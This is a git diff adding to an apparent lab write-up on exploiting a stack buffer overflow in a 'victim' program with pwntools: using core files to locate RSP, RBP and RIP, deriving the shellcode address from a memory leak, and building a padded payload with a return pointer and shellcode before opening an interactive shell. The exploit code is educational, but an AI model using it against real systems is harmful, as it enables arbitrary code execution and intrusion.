@@ -57,6 +57,73 @@ The next place was the credit card number request.  I used a similair method to 
 
 ### Step 2: Identifying where to write 
 
-From step 1 we have 
+From step 1 we have Identified both of the needed vulnerabilities. The next step is to use these vulnerabilities as well as core files to write our shellcode and a return pointer to it. 
+
+#### Identifying where to write. 
+
+From there we forced segmentation faults to create core files. We do this because we want to validate the memory address of where the program is running as well as the stack locations of the RSP RIP and RBP.
+
+![image](https://user-images.githubusercontent.com/44854053/235513424-9528fd54-605e-4eea-8959-b7b8aa61a329.png)
+
+we get this information by slightly overwriting the buffer as well as generating the core file by using this code segment
+
+```py 
+
+#generate a core file to check key value
+core = victim.corefile
+rsp = core.rsp
+rbp = core.rbp
+
+rip = core.rip
+#read at rsp 8 bytes,then at +8 rsp then at +8 that
+topostack = core.read(rsp,8)
+topostack_1 = core.read(rsp+8,8)
+topostack_2 = core.read(rsp+16,8)
+
+#gettin the memory adresses
+print(f"rsp: {hex(rsp)}")
+print(f"rbp: {hex(rbp)}")
+print(f"rip: {hex(rip)}")
 
 
+print(f"Top of stack contains:{hex(int.from_bytes(topostack,'little'))}")
+print(f"Top of stack +1 contains:{hex(int.from_bytes(topostack_1,'little'))}")
+print(f"Top of stack +2 contains:{hex(int.from_bytes(topostack_2,'little'))}")
+print(f"I think the shellcode is at:{hex(shellcodeplace)}")
+
+```
+
+From the core file I fine tuned the number of bytes until we could see the shellcode near where we want it. 
+
+### Completing the injection
+
+From there it was a matter of generating tests and potential sizes of bufferoverflow to write. This included predicting where our overwritten rsp would point to the shellcode. 
+
+![image](https://user-images.githubusercontent.com/44854053/235514687-caa97db4-3da9-49b8-95d9-b1a4bb90f137.png)
+
+By trial and error we could see that the adress generated from our memory leak tended to be hex 20 from our predicted. We then used the following code to generate the overflow we then use the interactive command to check that our shellcode was properly injected. It also allows us to run multiple commands in the shellcode.
+
+```py
+#by looking at our prints we can see shell at top of stack is +10 
+#from our memory leak we want to put this in rip for the return
+shellcodeplace = leak_int + 0x20
+
+#the buffer overflow
+#we need between 130 & 150 bytes
+input2 =  b"A"*128 + b"ZZZZZZZZ"+ p64(shellcodeplace) + shellcode 
+victim.sendline(input2)
+
+print(str(victim.recvline(), "latin-1"))
+
+#victim.sendline(payload)
+victim.interactive()
+
+```
+I then tested this by running the program multiple times. 
+
+![image](https://user-images.githubusercontent.com/44854053/235515385-c305f384-e6fd-4d39-9c83-4f5466175183.png)
+
+
+![image](https://user-images.githubusercontent.com/44854053/235515318-a3df19bc-ad3f-4b18-b9f5-99808b7e6d9b.png)
+
+## The completed program ![code](./controlflowviolation/inject.py)
